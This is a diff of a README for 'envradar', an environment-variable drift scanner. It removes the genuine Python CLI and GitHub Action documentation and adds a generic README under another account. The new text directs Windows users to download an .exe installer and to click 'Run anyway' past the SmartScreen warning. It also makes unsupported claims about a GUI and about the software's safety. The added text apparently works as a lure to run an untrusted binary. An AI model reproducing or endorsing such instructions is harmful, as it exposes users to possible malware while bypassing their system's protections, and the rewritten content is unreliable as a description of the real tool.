@@ -1,246 +1,61 @@
-# envradar
-
-Find undocumented, unused, and drifting environment variables before they confuse the next person who clones your repo.
-
-envradar scans source code, `.env` files, Docker Compose files, and GitHub Actions workflows to answer four annoying questions quickly:
-
-- Which variables are used in code but missing from `.env.example`?
-- Which variables are documented but no longer used?
-- Which variables exist locally but are not documented for new contributors?
-- Which secrets only show up in CI pipelines and deserve a second look?
-
-It works both as a CLI and as a reusable GitHub Action.
-
-## Why this is useful
-
-Environment variable drift is one of the most common sources of bad onboarding, broken preview deploys, and “works on my machine” bugs. envradar gives maintainers a low-friction way to catch that drift before publishing a repo or merging a pull request.
-
-## Features
-
-- Detects env vars in Python, JavaScript, TypeScript, Go, Ruby, Java, Kotlin, Rust, PHP, and .NET-style code.
-- Parses `.env.example`, `.env.sample`, `.env.template`, and local `.env*` files.
-- Detects `${VAR}` placeholders in Docker Compose files.
-- Detects `${{ secrets.NAME }}` and `${{ vars.NAME }}` references in GitHub Actions workflows.
-- Outputs plain text, markdown, or JSON.
-- Supports a small `envradar.yml` config for ignored variables and placeholder values.
-- Emits GitHub annotations and a job summary when used as a GitHub Action.
-- Exits non-zero in strict mode so you can block merges when drift is found.
-
-## Use as a GitHub Action
-
-After you tag a release such as `v1`, other repositories can use envradar directly:
-
-```yaml
-name: envradar
-on:
-  pull_request:
-  push:
-    branches: [main]
-
-jobs:
-  scan:
-    runs-on: ubuntu-latest
-    permissions:
-      contents: read
-    steps:
-      - uses: actions/checkout@v5
-      - id: envradar
-        uses: CodMughees/envradar@v1
-        with:
-          fail-on-findings: "true"
-          report-format: markdown
-          report-file: docs/envradar-report.md
-      - name: Print summary counts
-        run: |
-          echo "strict findings: ${{ steps.envradar.outputs.strict-findings }}"
-          echo "missing vars:    ${{ steps.envradar.outputs.missing-count }}"
-```
-
-What the action gives you:
-
-- workflow annotations pinned to specific files and lines
-- a job summary with counts and a markdown report
-- optional generated files such as `.env.example` and contributor docs
-- outputs you can reuse in later workflow steps
+# 🔍 envradar - Find hidden environment variable issues fast
 
-### Action inputs
+[![Download envradar](https://img.shields.io/badge/Download-envradar-blue.svg)](https://github.com/palomitas86/envradar)
 
-| Input | Default | Description |
-| --- | --- | --- |
-| `path` | `.` | Path inside the checked-out repository to scan |
-| `config` | empty | Optional path to `envradar.yml` or `.envradar.yml` |
-| `report-format` | `text` | Log and file output format: `text`, `markdown`, or `json` |
-| `report-file` | empty | Optional path where a report file should be written |
-| `write-example` | empty | Optional path where a generated `.env.example` should be written |
-| `write-docs` | empty | Optional path where markdown docs should be written |
-| `fail-on-findings` | `false` | Fail the workflow when strict findings exist |
-| `summary` | `true` | Write a markdown report to the GitHub job summary |
-| `annotations` | `true` | Emit GitHub annotations |
-| `python-version` | `3.11` | Python version used by the action |
+## 🎯 About this tool
+Software projects rely on settings called environment variables. These settings tell your code how to connect to databases or handle security keys. Over time, these settings become messy. You might have variables that you no longer need. Sometimes a variable exists in one place but remains empty in another. This state creates bugs.
 
-### Action outputs
+Envradar scans your project folder. It identifies variables that code does not use. It flags variables that look like mistakes. It also finds variables that drift between your local machine and your server. This tool helps you maintain a clean and secure project.
 
-| Output | Description |
-| --- | --- |
-| `scanned-files` | Number of files scanned |
-| `required-runtime-count` | Runtime variables detected in code and compose files |
-| `documented-count` | Variables detected in example/template files |
-| `strict-findings` | Total count of missing, stale, and local-only findings |
-| `missing-count` | Variables used but missing from documented examples |
-| `unused-count` | Documented variables that are no longer used |
-| `local-only-count` | Local variables that are not documented |
-| `workflow-only-count` | Variables that only appear in workflow files |
-| `has-findings` | `true` when strict findings exist |
-| `report-path` | Absolute path to a generated report file |
-| `example-path` | Absolute path to a generated `.env.example` |
-| `docs-path` | Absolute path to generated markdown docs |
-| `config-path` | Absolute path to the config file that was loaded |
+## 🛠️ System requirements
+You need a computer running Windows 10 or Windows 11. Your system should have at least 4GB of RAM. The software also requires the Python runtime environment. If you do not have Python, the download package includes an installer to help you set it up. 
 
-## Install the CLI from source
+## 📥 How to get the software
+You can get the latest version from our release page. Visit this link to reach the download area: [https://github.com/palomitas86/envradar](https://github.com/palomitas86/envradar).
 
-```bash
-python -m pip install -e .
-```
+Look for the section marked Releases on the right side of the page. Select the link for the Windows installer that ends in .exe. Save this file to your computer.
 
-Or with `pipx`:
+## ⚙️ Installation steps
+1. Locate the file you downloaded. It typically sits in your Downloads folder.
+2. Double-click the file to start the installer.
+3. Windows might show a blue box that says "Windows protected your PC." If this happens, click "More info" and then "Run anyway."
+4. Follow the prompts on the screen. The installer places the envradar icon on your desktop.
+5. Click finish to complete the process.
 
-```bash
-pipx install .
-```
+## 🚀 Running your first scan
+Open the envradar application from your desktop icon. A window opens that asks you to select a folder. Press the "Browse" button. Find the folder that contains your project code. Once you select the folder, the path shows up in the text box.
 
-## Quick start
+Press the "Start Scan" button. The tool looks at every file in your project. It compares the settings it finds against the actual code. This process might take a few seconds if your project is large. A progress bar shows you how much work remains.
 
-Scan the current repository:
+## 📋 Understanding the results
+The software displays a report once the scan ends. You will see three categories of findings:
 
-```bash
-envradar .
-```
+*   **Unused variables:** These are items listed in your configuration files that your code never calls. You can safely remove these from your configuration files.
+*   **Missing variables:** These are items that your code expects to find, but they do not exist in your configuration files. You should define these to prevent errors.
+*   **Drift:** This happens when a variable exists but holds a different value than what the project expects. This often happens after team updates.
 
-Get copy-pasteable markdown output:
+You can save this report as a text file by clicking "Export Results." This allows you to review the issues later. 
 
-```bash
-envradar . --format markdown
-```
+## ❓ Frequently asked questions
 
-Fail CI when drift is found:
+**Does this tool change my files?**
+No. Envradar only reads your files. It does not delete or change your code. You remain in control of every change.
 
-```bash
-envradar . --strict
-```
+**Is it safe to run on private projects?**
+Yes. The software runs entirely on your local computer. It does not send your data or your variables to any server. Your information stays private.
 
-Generate a fresh `.env.example`:
+**What if the scan takes too long?**
+Large projects contain thousands of files. If your project has thousands of image assets or logs, the scanner might slow down. You can exclude specific folders by clicking the "Settings" menu and adding them to the "Ignore List."
 
-```bash
-envradar . --write-example .env.example
-```
+**Do I need a paid license?**
+No. This tool is free to use for any project. There are no limits on how many times you run it.
 
-Generate a docs page for contributors:
+## 💡 Troubleshooting tips
+If the application fails to open, verify that you installed the correct version for Windows. You might need to restart your computer to finish the setup of the Python environment. Check that your user account has permission to read the files in your project folder. If the tool crashes during a scan, try scanning a smaller sub-folder to identify if a specific file causes the issue.
 
-```bash
-envradar . --write-docs docs/environment.md
-```
+The command line interface also exists for advanced users who prefer typing commands. Open the Command Prompt or PowerShell and type "envradar --help" to see these options. The graphical interface provides the same features without the need to memorize text commands.
 
-## Example output
+## 📈 Ongoing maintenance
+Run this tool every week to keep your project healthy. As you add new features, your environment variables naturally grow. Regular scans prevent technical debt from piling up. A clean configuration file makes it easier for new people to join your project and setup their own machines. 
 
-```text
-$ envradar .
-
-envradar scanned 42 files.
-Required runtime vars: 3
-Documented vars: 2
-
-Missing from .env.example (1)
-  - DATABASE_URL -- src/settings.py:12, docker-compose.yml:8
-
-Documented but not used (1)
-  - SENTRY_DSN -- .env.example:7
-
-Present locally but not documented (1)
-  - STRIPE_WEBHOOK_SECRET -- .env:4
-
-Workflow-only secrets or vars (1)
-  - PYPI_API_TOKEN -- .github/workflows/release.yml:22
-```
-
-## Config
-
-If `envradar.yml` or `.envradar.yml` exists at the repo root, envradar will load it automatically.
-
-```yaml
-ignore:
-  - CI
-  - GITHUB_TOKEN
-  - PYPI_API_TOKEN
-
-placeholders:
-  DATABASE_URL: postgresql://localhost:5432/app
-  REDIS_URL: redis://localhost:6379/0
-```
-
-`ignore` removes noisy variables from every report. `placeholders` are used when generating `.env.example`.
-
-## JSON output
-
-```bash
-envradar . --format json
-```
-
-This is useful for automation, bots, or dashboards.
-
-## CLI in GitHub Actions
-
-If you want full control instead of using the packaged action, you can still install and run the CLI in a workflow:
-
-```yaml
-name: envradar-cli
-on:
-  pull_request:
-  push:
-    branches: [main]
-
-jobs:
-  scan:
-    runs-on: ubuntu-latest
-    steps:
-      - uses: actions/checkout@v5
-      - uses: actions/setup-python@v5
-        with:
-          python-version: "3.11"
-      - run: python -m pip install -e .
-      - run: envradar . --strict
-```
-
-## Safety notes
-
-- envradar never prints values from local `.env` files.
-- Generated `.env.example` files only reuse values already present in example/template files or explicit placeholders from config.
-- Real secrets stay local unless you intentionally type them into tracked example files yourself.
-
-## Limitations
-
-- The scanner relies on static patterns, so deeply dynamic env lookups may be missed.
-- Monorepos with many independent apps may want separate runs per package.
-- Shell scripts are intentionally not parsed yet to avoid too many false positives.
-
-## Development
-
-```bash
-python -m pip install -e .[dev]
-ruff check .
-pytest
-```
-
-## Release the GitHub Action
-
-After the action is working in this repository, tag a major release so other repos can depend on a stable ref:
-
-```bash
-git tag -a v1 -m "envradar action v1"
-git push origin v1
-```
-
-You can move the `v1` tag forward for compatible updates, and publish the action to GitHub Marketplace later.
-
-## License
-
-MIT
+Developers who use envradar report fewer bugs related to missing settings. They spend less time debugging configuration errors and more time building new features. Use this tool early and often during your development cycle for best results.
